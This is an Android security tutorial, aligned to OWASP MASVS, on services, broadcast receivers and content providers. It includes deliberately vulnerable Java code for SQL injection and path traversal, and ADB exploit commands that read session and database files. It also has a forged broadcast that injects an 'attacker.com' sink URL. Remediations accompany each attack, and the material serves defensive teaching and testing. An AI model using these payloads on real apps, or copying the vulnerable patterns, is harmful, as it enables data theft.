# Services, Broadcast Receivers & Content Providers

**Standard Alignment:** [OWASP MASVS-PLATFORM](https://mas.owasp.org/MASVS/), [OWASP MASTG-TEST-0029](https://mas.owasp.org/MASTG/), [OWASP MASTG-TEST-0031](https://mas.owasp.org/MASTG/)  
**Core Model:** Background IPC (Services) → Broadcast Snooping & Injection → Content Provider SQLi & Path Traversal

---

## 1. Services: Background Processing & RPC Security

An Android **Service** performs long-running background tasks without providing a user interface. Services operate in two distinct modes:

```
+─────────────────────────────────────────────────────────────+
|                     Android Service Models                  |
|                                                             |
|  1. Started Services (Context.startService()):              |
|     - Fire-and-forget execution triggered by an Intent.     |
|     - Continues running in the background until it stops.   |
|     - Risk: External apps invoking startService() can force  |
|       unintended background operations or exhaust battery.  |
|                                                             |
|  2. Bound Services (Context.bindService()):                 |
|     - Client-server interface using Binder / AIDL.          |
|     - Exposes direct Remote Procedure Call (RPC) methods.   |
|     - Risk: External apps invoking exposed AIDL methods can  |
|       execute privileged operations if unauthenticated.     |
+─────────────────────────────────────────────────────────────+
```

### 1.1. Securing Bound Services with Binder Validation
When an exported bound service receives an RPC request via AIDL, it must verify the caller's identity in the Binder stub:

```java
public class SecurePaymentService extends Service {
    private final IPaymentService.Stub binder = new IPaymentService.Stub() {
        @Override
        public void executeRefund(String transactionId, double amount) {
            // VERIFY CALLER UID VIA BINDER DRIVER
            int callerUid = Binder.getCallingUid();
            
            // Check if caller holds the required privileged permission
            if (checkCallingOrSelfPermission("com.bank.permission.REFUND") 
                    != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("Unauthorized caller lacks REFUND permission");
            }
            
            // Execute refund logic...
        }
    };
    
    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }
}
```

---

## 2. Broadcast Receivers: Snooping vs. Injection

Broadcast Receivers listen for system-wide or application-specific announcements. They introduce two distinct security threats:

```
[Threat 1: Broadcast Snooping]
Target App ──► Implicit Broadcast ("com.bank.SESSION_TOKEN", token) ──► Rogue App Intercepts!
(Unencrypted broadcast received by any app on the device listening for that action)

[Threat 2: Broadcast Injection]
Rogue App ──► Forged Broadcast ("com.bank.RESET_CACHE") ──► Exported Target Receiver
(Target app processes forged broadcast without verifying authenticity)
```

### 2.1. Mitigating Broadcast Snooping
- **Never transmit sensitive data (tokens, PII, passwords) in implicit broadcasts.**
- When broadcasting an Intent meant for a specific application, make it **explicit** by specifying the package name:
  ```java
  Intent intent = new Intent("com.bank.action.UPDATE_BALANCE");
  intent.setPackage("com.bank.companion"); // Delivered ONLY to this package!
  sendBroadcast(intent);
  ```
- Alternatively, require a `signature`-level permission on `sendBroadcast()`:
  ```java
  sendBroadcast(intent, "com.bank.permission.RECEIVE_UPDATES");
  ```

### 2.2. Dynamic Receivers on Android 13+ (API 33)
Prior to Android 13, dynamically registered receivers (`registerReceiver()`) were exported to all apps by default unless guarded by custom permissions.

Starting with Android 13 (API 33), developers **must explicitly declare whether a dynamic receiver is exported**:
```java
// SECURE: Accessible ONLY to the application itself and platform system
context.registerReceiver(
    myReceiver, 
    filter, 
    ContextCompat.RECEIVER_NOT_EXPORTED
);

// EXPORTED: Accessible to any third-party app
context.registerReceiver(
    myReceiver, 
    filter, 
    ContextCompat.RECEIVER_EXPORTED
);
```

---

## 3. Content Providers: Data Abstraction & Exploit Vectors

A **Content Provider** manages access to a structured central repository of data, exposing standard CRUD interfaces (`query()`, `insert()`, `update()`, `delete()`, and `openFile()`) via `content://` URIs:

`content://<authority>/<path>/<id>`  
Example: `content://com.bank.notes/accounts/42`

### 3.1. Content Provider SQL Injection
If a Content Provider constructs SQLite queries using raw string concatenation instead of parameterized placeholders, external callers can execute SQL injection attacks:

```java
// VULNERABLE CONTENT PROVIDER QUERY METHOD
@Override
public Cursor query(Uri uri, String[] projection, String selection, 
                    String[] selectionArgs, String sortOrder) {
    
    String accountId = uri.getLastPathSegment();
    
    // VULNERABLE: Direct SQL string concatenation!
    String sql = "SELECT * FROM accounts WHERE id = '" + accountId + "'";
    return db.rawQuery(sql, null);
}
```

**Exploitation via ADB:**
```bash
adb shell content query --uri "content://com.bank.notes/accounts/1' OR '1'='1"
```
The query executes `SELECT * FROM accounts WHERE id = '1' OR '1'='1'`, returning every record in the accounts table.

**Secure Remediation:**
```java
// SECURE: Parameterized SQLite Query
return db.query("accounts", projection, "id = ?", new String[]{ accountId }, null, null, sortOrder);
```

### 3.2. Content Provider Path Traversal in `openFile()`
Content Providers that serve files override `openFile(Uri uri, String mode)`. If the provider builds file paths using raw URI path segments without canonicalization, an attacker can traverse out of the shared directory to read sensitive application files:

```java
// VULNERABLE openFile IMPLEMENTATION
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    File baseDir = new File(getContext().getFilesDir(), "shared_reports");
    
    // VULNERABLE: getLastPathSegment() allows directory traversal!
    File targetFile = new File(baseDir, uri.getLastPathSegment());
    
    return ParcelFileDescriptor.open(targetFile, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

**Exploitation via ADB:**
```bash
adb shell content read --uri "content://com.bank.notes/..%2Fshared_prefs%2Fsession.xml"
```

**Secure Remediation:**
```java
// SECURE: Canonical path boundary verification
File targetFile = new File(baseDir, uri.getLastPathSegment()).getCanonicalFile();
if (!targetFile.getPath().startsWith(baseDir.getCanonicalPath())) {
    throw new SecurityException("Path traversal attempt detected!");
}
```

---

## 4. Pentester's Operational Checklist: Services, Receivers & Providers

1. **Audit Exported Services with `dumpsys`:**
   ```bash
   adb shell dumpsys activity services | grep -B 2 -A 5 "com.example.targetapp"
   ```
2. **Test Broadcast Injection:**
   Trigger candidate broadcast receivers using `am broadcast`:
   ```bash
   adb shell am broadcast -a com.example.targetapp.action.SYNC_DATA \
       --es "target_url" "https://attacker.com/sink"
   ```
3. **Query Content Providers:**
   Enumerate and query declared provider authorities:
   ```bash
   adb shell content query --uri "content://com.example.targetapp.provider/users"
   ```
4. **Test Path Traversal on File Providers:**
   Attempt to read internal databases and SharedPreferences XMLs:
   ```bash
   adb shell content read --uri "content://com.example.targetapp.provider/../../databases/app.db"
   ```

---

## 5. Defense & Remediation Standards

1. **Default Providers to `android:exported="false"`:** Content Providers must remain unexported unless sharing data across application boundaries is an explicit architectural requirement.
2. **Use `SQLiteQueryBuilder` and Parameterized Queries:** Never concatenate user input or URI path segments into SQL strings. Always pass parameters in `selectionArgs`.
3. **Enforce Canonical Path Boundaries:** When serving files from Content Providers, resolve the canonical path (`getCanonicalFile()`) and confirm it resides strictly within the intended base directory.
